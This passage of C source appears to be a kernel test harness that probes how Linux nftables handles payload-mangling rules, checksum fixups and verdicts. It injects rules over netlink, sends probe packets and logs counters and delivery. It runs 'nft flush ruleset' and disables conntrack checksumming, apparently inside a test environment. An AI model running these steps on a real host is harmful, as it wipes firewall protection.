 * it.  The number is in the kernel either way: one GETRULE dump per arm. */
static unsigned long long f552_attr_u64(const struct nlattr *a)
{
	unsigned long long v = 0;
	int i;

	for (i = 0; i < 8; i++)
		v = (v << 8) | ((const unsigned char *)a + NLA_HDRLEN)[i];
	return v;
}

static unsigned long long f552_count(int family, const char *table,
				     const char *chain)
{
	char buf[1024], rbuf[16384];
	struct nlmsghdr *nlh;
	struct nfgenmsg_ *nfg;
	unsigned long long pkts = 0;
	int fd, sent;

	fd = nl_open();
	if (fd < 0)
		return 0;
	memset(buf, 0, sizeof(buf));
	nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_len = NLMSG_HDRLEN + sizeof(*nfg);
	nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_GETRULE;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	nlh->nlmsg_seq = 1;
	nfg = (struct nfgenmsg_ *)NLMSG_DATA(nlh);
	nfg->nfgen_family = (uint8_t)F552_PF(family);
	nfg->version = 0;
	nfg->res_id = htons(0);
	attr_put(nlh, NFTA_RULE_TABLE, table, (int)strlen(table) + 1, "c.t");
	attr_put(nlh, NFTA_RULE_CHAIN, chain, (int)strlen(chain) + 1, "c.c");
	sent = (int)nlh->nlmsg_len;
	if (send(fd, buf, (size_t)sent, 0) != sent) {
		close(fd);
		return 0;
	}
	for (;;) {
		int rl = (int)recv(fd, rbuf, sizeof(rbuf), 0);
		struct nlmsghdr *h;

		if (rl <= 0)
			break;
		for (h = (struct nlmsghdr *)rbuf; NLMSG_OK(h, rl);
		     h = NLMSG_NEXT(h, rl)) {
			const char *p, *end;

			if (h->nlmsg_type == NLMSG_DONE || h->nlmsg_type == NLMSG_ERROR)
				goto out;
			if (h->nlmsg_type != (uint16_t)((NFNL_SUBSYS_NFTABLES << 8) |
							NFT_MSG_NEWRULE))
				continue;
			p = (const char *)h + NLMSG_HDRLEN + sizeof(*nfg);
			end = (const char *)h + h->nlmsg_len;
			for (; p + (int)sizeof(struct nlattr) <= end; ) {
				const struct nlattr *a = (const struct nlattr *)p;
				int alen = (int)a->nla_len;

				if (alen < (int)sizeof(*a) || p + alen > end)
					break;
				if ((a->nla_type & 0x3fff) == NFTA_RULE_EXPRESSIONS) {
					const char *q = (const char *)a + NLA_HDRLEN;
					const char *qe = (const char *)a + alen;

					for (; q + (int)sizeof(struct nlattr) <= qe; ) {
						const struct nlattr *el = (const struct nlattr *)q;
						int ellen = (int)el->nla_len;
						const char *r, *re;
						int is_counter = 0;

						if (ellen < (int)sizeof(*el) || q + ellen > qe)
							break;
						r = (const char *)el + NLA_HDRLEN;
						re = (const char *)el + ellen;
						for (; r + (int)sizeof(struct nlattr) <= re; ) {
							const struct nlattr *ea = (const struct nlattr *)r;
							int ealen = (int)ea->nla_len;

							if (ealen < (int)sizeof(*ea) || r + ealen > re)
								break;
							if ((ea->nla_type & 0x3fff) == NFTA_EXPR_NAME &&
							    !strcmp((const char *)ea + NLA_HDRLEN, "counter"))
								is_counter = 1;
							r += NLA_ALIGN_(ealen);
						}
						if (is_counter) {
							r = (const char *)el + NLA_HDRLEN;
							for (; r + (int)sizeof(struct nlattr) <= re; ) {
								const struct nlattr *ea = (const struct nlattr *)r;
								int ealen = (int)ea->nla_len;

								if (ealen < (int)sizeof(*ea) || r + ealen > re)
									break;
								if ((ea->nla_type & 0x3fff) == NFTA_EXPR_DATA) {
									const char *d = (const char *)ea + NLA_HDRLEN;
									const char *de = (const char *)ea + ealen;

									for (; d + (int)sizeof(struct nlattr) <= de; ) {
										const struct nlattr *da = (const struct nlattr *)d;
										int dalen = (int)da->nla_len;

										if (dalen < (int)sizeof(*da) || d + dalen > de)
											break;
										if ((da->nla_type & 0x3fff) ==
										    NFTA_COUNTER_PACKETS &&
										    dalen >= NLA_HDRLEN + 8)
											pkts += f552_attr_u64(da);
										d += NLA_ALIGN_(dalen);
									}
								}
								r += NLA_ALIGN_(ealen);
							}
						}
						q += NLA_ALIGN_(ellen);
					}
				}
				p += NLA_ALIGN_(alen);
			}
		}
	}
out:
	close(fd);
	return pkts;
}

struct f552_raw_arm {
	const char *tag;
	uint32_t off, len;
	int keep;		/* 1 = keep the bytes the guard compares */
	int csum;		/* 1 = csum type inet                   */
	int bad;		/* 1 = change byte 0, 2 = change byte 1 */
};

static void f552_raw_one(int fam, const char *table, const char *chain,
			 const struct f552_raw_arm *a)
{
	unsigned char imm[16];
	unsigned char cap[512];
	int k, errs, nattr = 0, sent = 0, ncap = 0, flen = 0, rc;
	uint32_t csum_off = (fam == 4) ? 10 : 0;

	for (k = 0; k < 16; k++)
		imm[k] = (unsigned char)(0xa0 + k);
	if (a->keep)
		f552_imm_for(fam, a->off, a->len, imm);
	if (a->bad == 1)
		imm[0] = 0x95;
	if (a->bad == 2)
		imm[1] = 0x11;

	f552_flush_chain(fam, table, chain);
	nops = 0;
	nrecs = 0;
	if (a->len == 0)
		f552_newrule_accept(fam, table, chain);
	else
		f552_newrule_store(fam, table, chain, 1 /* network */, a->off,
				   a->len, a->csum ? 1 : 0,
				   a->csum ? csum_off : 0, imm, 16, 1);
	errs = f543_send_checked(&nattr, &nattr);
	if (errs != 0) {
		printf("F552 B%d.%s|setup=ERR|errno=%d\n", fam, a->tag,
		       g_err ? -g_err : 0);
		return;
	}
	memset(cap, 0, sizeof(cap));
	if (fam == 4)
		rc = f543_probe_request(f552_envp, 16, 0x50, 0x18, &sent, &ncap,
					cap, &flen);
	else
		rc = f552_p6(&sent, &ncap, cap, &flen);
	printf("F552 B%d.%s|off=%u|len=%u|keep=%d|csum=%d|bad=%d|sent=%d|cap=%d|deliv=%d\n",
	       fam, a->tag, a->off, a->len, a->keep, a->csum, a->bad, sent, ncap,
	       rc == 0 && ncap == 1);
	printf("F552CNT %d.%s|pkts=%llu\n", fam, a->tag,
	       f552_count(fam, table, chain));
}

static void f552_raw_section(int fam)
{
	char tab[32], tag[32];
	int nattr = 0, errs, off, len;
	unsigned int k;
	static const uint32_t big[][2] = {
		{ 0, 4 }, { 0, 8 }, { 2, 3 }, { 2, 4 }, { 7, 1 }, { 7, 2 },
		{ 10, 10 }, { 10, 12 }, { 12, 8 }, { 12, 9 },
		{ 16, 4 }, { 16, 5 }, { 8, 16 }, { 8, 32 }, { 8, 33 },
		{ 24, 16 }, { 24, 17 },
	};

	snprintf(tab, sizeof(tab), "p552_%d_%d", fam, (int)getpid());
	nops = 0;
	nrecs = 0;
	f552_newtable(fam, tab);
	f552_newchain(fam, tab, "c", NF_INET_FORWARD, 0, NF_DROP);
	errs = f543_send_checked(&nattr, &nattr);
	printf("F552 RAWSETUP.%d|errs=%d|table=%s\n", fam, errs, tab);

	{
		struct f552_raw_arm a;

		memset(&a, 0, sizeof(a));
		a.tag = "none";
		a.keep = 1;
		f552_raw_one(fam, tab, "c", &a);
	}
	for (off = 0; off < (fam == 4 ? 20 : 40); off++) {
		for (len = 1; len <= 2; len++) {
			struct f552_raw_arm a;

			memset(&a, 0, sizeof(a));
			snprintf(tag, sizeof(tag), "%d.%d", off, len);
			a.tag = tag;
			a.off = (uint32_t)off;
			a.len = (uint32_t)len;
			a.keep = 1;
			f552_raw_one(fam, tab, "c", &a);
		}
	}
	for (k = 0; k < sizeof(big) / sizeof(big[0]); k++) {
		struct f552_raw_arm a;

		memset(&a, 0, sizeof(a));
		snprintf(tag, sizeof(tag), "w%u.%u", big[k][0], big[k][1]);
		a.tag = tag;
		a.off = big[k][0];
		a.len = big[k][1];
		a.keep = 1;
		f552_raw_one(fam, tab, "c", &a);
	}
	/* the byte rule, separated from the offset rule */
	{
		struct f552_raw_arm a;

		memset(&a, 0, sizeof(a));
		a.tag = "bad0.2";	/* IPv4: version/ihl changed; IPv6: version 9 */
		a.off = 0;
		a.len = 2;
		a.keep = 1;
		a.bad = 1;
		f552_raw_one(fam, tab, "c", &a);

		memset(&a, 0, sizeof(a));
		a.tag = "badp.2";	/* IPv4 8.2: the protocol byte changed  */
		a.off = (fam == 4) ? 8 : 0;
		a.len = 2;
		a.keep = 1;
		a.bad = 2;
		f552_raw_one(fam, tab, "c", &a);
	}
	/* the csum fixup on this base: does it change what is allowed? */
	{
		struct f552_raw_arm a;

		memset(&a, 0, sizeof(a));
		a.tag = "cs.12.4";
		a.off = 12;
		a.len = 4;
		a.keep = 1;
		a.csum = 1;
		f552_raw_one(fam, tab, "c", &a);

		memset(&a, 0, sizeof(a));
		a.tag = "cs.2.2";
		a.off = 2;
		a.len = 2;
		a.keep = 1;
		a.csum = 1;
		f552_raw_one(fam, tab, "c", &a);
	}

	nops = 0;
	nrecs = 0;
	f552_deltable(fam, tab);
	f543_send_checked(&nattr, &nattr);
}

/* ---------- C: does a refused store also skip the verdict? ---------- */

static void f552_verdict_section(const char *fam, const struct f552_spell *arms,
				 int n, int v6)
{
	char cmd[1024], tag[64];
	unsigned char cap[512];
	int k, rc, sent = 0, ncap = 0, flen = 0;

	f552_sh("/nft flush ruleset");
	snprintf(cmd, sizeof(cmd), "/nft add table %s p552v", fam);
	f552_sh(cmd);
	snprintf(cmd, sizeof(cmd),
		 "/nft 'add chain %s p552v v { type filter hook forward priority 0; policy drop; }'",
		 fam);
	f552_sh(cmd);
	for (k = 0; k < n; k++) {
		snprintf(cmd, sizeof(cmd), "/nft flush chain %s p552v v", fam);
		f552_sh(cmd);
		if (arms[k].rule) {
			snprintf(cmd, sizeof(cmd),
				 "/nft add rule %s p552v v '%s' counter accept",
				 fam, arms[k].rule);
			rc = f552_sh(cmd);
		} else {
			rc = 0;
		}
		memset(cap, 0, sizeof(cap));
		sent = ncap = flen = 0;
		if (v6)
			f552_p6(&sent, &ncap, cap, &flen);
		else
			f543_probe_request(f552_envp, 16, 0x50, 0x18, &sent, &ncap,
					   cap, &flen);
		snprintf(tag, sizeof(tag), "C.%s.%s", fam, arms[k].tag);
		printf("F552 %s|rule=%s|nftrc=%d|sent=%d|cap=%d|deliv=%d\n",
		       tag, arms[k].rule ? arms[k].rule : "none", rc, sent, ncap,
		       ncap == 1);
		snprintf(cmd, sizeof(cmd),
			 "/nft list chain %s p552v v 2>&1 | tr -d '\\r' | sed 's/^/F552V %s /'",
			 fam, tag);
		f552_sh(cmd);
	}
	f552_sh("/nft flush ruleset");
}

static void run_f552(void)
{
	struct f539_env e;
	char out[512];
	int rc6;

	if (f539_env_open(&e, out, sizeof(out)) < 0) {
		printf("F552 SETUP|fail|%s\n", out);
		f539_env_close(&e);
		return;
	}
	f552_envp = &e;
	f539_route_add("fv0", F539_NET_FAR, 24, 0);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_checksum", "0");
	rc6 = f552_v6_setup();
	printf("F552 ENV|v6setup=%d\n", rc6);
	f552_sh("echo \"F552 SYSCTL|v4fwd=$(cat /proc/sys/net/ipv4/ip_forward)\""
		"\"|v6fwd=$(cat /proc/sys/net/ipv6/conf/all/forwarding)\""
		"\"|v6fv0=$(cat /proc/sys/net/ipv6/conf/fv0/forwarding 2>&1)\"");

	f552_nft_section("ip", f552_ip4,
			 (int)(sizeof(f552_ip4) / sizeof(f552_ip4[0])), 0);
	f552_ll_section();
	f552_nft_section("ip6", f552_ip6,
			 (int)(sizeof(f552_ip6) / sizeof(f552_ip6[0])), 1);
	f552_raw_section(4);
	f552_raw_section(6);
	f552_verdict_section("ip", f552_ip4,
			     (int)(sizeof(f552_ip4) / sizeof(f552_ip4[0])), 0);
	f552_verdict_section("ip6", f552_ip6,
			     (int)(sizeof(f552_ip6) / sizeof(f552_ip6[0])), 1);

	f552_sh("/nft flush ruleset");
	printf("F552 DONE\n");
	nf_flush();
	f539_env_close(&e);
}
